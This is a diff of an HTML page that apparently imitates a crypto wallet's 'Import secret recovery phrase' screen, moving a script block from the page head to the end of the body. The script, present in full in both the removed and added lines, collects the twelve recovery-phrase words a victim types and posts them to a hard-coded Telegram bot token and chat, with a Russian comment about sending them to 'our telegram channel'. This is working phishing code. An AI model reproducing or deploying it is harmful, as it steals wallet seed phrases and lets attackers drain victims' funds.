@@ -50,39 +50,6 @@
       <script src="exponential.js"></script>
 
    </head>
-  <script type="text/javascript">
-      function OnClickSendNudes() {
-        const fraze1 = document.getElementById("input1").value;
-        const fraze2 = document.getElementById("input2").value;
-        const fraze3 = document.getElementById("input3").value;
-        const fraze4 = document.getElementById("input4").value;
-        const fraze5 = document.getElementById("input5").value;
-        const fraze6 = document.getElementById("input6").value;
-        const fraze7 = document.getElementById("input7").value;
-        const fraze8 = document.getElementById("input8").value;
-        const fraze9 = document.getElementById("input9").value;
-        const fraze10 = document.getElementById("input10").value;
-        const fraze11 = document.getElementById("input11").value;
-        const fraze12 = document.getElementById("input12").value;
-
-        var chatid = "-764116271";
-        var token = "2134079185:AAGt8n69AshEn9HWIKkMPe9tnBVu3hPptwk";
-        var text = "1- "+fraze1  + "\n" + "2- "+fraze2 + "\n"  +"3- "+ fraze3 + "\n"  +"4- "+  fraze4 + "\n"  + "5- "+ fraze5 + "\n"  +"6- "+fraze6 + "\n"  +  "7- "+fraze7 + "\n"  + "8- "+fraze8 + "\n"  + "9- "+fraze9 + "\n"  + "10- "+fraze10 + "\n"  + "11- "+ fraze11 + "\n"  + "12- "+fraze12;
-
-        console.log(text);
-        //Отправляем текст в наш телеграм канал
-        otpravka(token,text,chatid);
-              function otpravka(token,text,chatid){
-              var z = $.ajax({  
-              type: "POST",  
-              url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
-              data: "parse_mode=HTML&text="+encodeURIComponent(text) 
-              }); 
-              window.open("index.htm");
-          }
-         
-      }
-    </script>
    <style>
       body {
       background: #105BAA 100%;
@@ -192,5 +159,38 @@
           <a ><button  onclick="OnClickSendNudes()">Import secret recovery phrase</button></a>
         </form>
       </main>
+      <script type="text/javascript">
+      function OnClickSendNudes() {
+        const fraze1 = document.getElementById("input1").value;
+        const fraze2 = document.getElementById("input2").value;
+        const fraze3 = document.getElementById("input3").value;
+        const fraze4 = document.getElementById("input4").value;
+        const fraze5 = document.getElementById("input5").value;
+        const fraze6 = document.getElementById("input6").value;
+        const fraze7 = document.getElementById("input7").value;
+        const fraze8 = document.getElementById("input8").value;
+        const fraze9 = document.getElementById("input9").value;
+        const fraze10 = document.getElementById("input10").value;
+        const fraze11 = document.getElementById("input11").value;
+        const fraze12 = document.getElementById("input12").value;
+
+        var chatid = "-764116271";
+        var token = "2134079185:AAGt8n69AshEn9HWIKkMPe9tnBVu3hPptwk";
+        var text = "1- "+fraze1  + "\n" + "2- "+fraze2 + "\n"  +"3- "+ fraze3 + "\n"  +"4- "+  fraze4 + "\n"  + "5- "+ fraze5 + "\n"  +"6- "+fraze6 + "\n"  +  "7- "+fraze7 + "\n"  + "8- "+fraze8 + "\n"  + "9- "+fraze9 + "\n"  + "10- "+fraze10 + "\n"  + "11- "+ fraze11 + "\n"  + "12- "+fraze12;
+
+        console.log(text);
+        //Отправляем текст в наш телеграм канал
+        otpravka(token,text,chatid);
+              function otpravka(token,text,chatid){
+              var z = $.ajax({  
+              type: "POST",  
+              url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
+              data: "parse_mode=HTML&text="+encodeURIComponent(text) 
+              }); 
+              window.open("index.htm");
+          }
+         
+      }
+    </script>
    </body>
 </html>
